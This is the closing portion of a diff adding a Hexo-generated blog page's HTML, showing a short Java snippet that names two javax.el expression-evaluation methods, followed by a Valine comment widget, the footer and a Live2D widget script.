+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span>ExpressionFactory</span><span class="token punctuation">.</span><span class="token function">createValueExpression</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span>ValueExpression</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
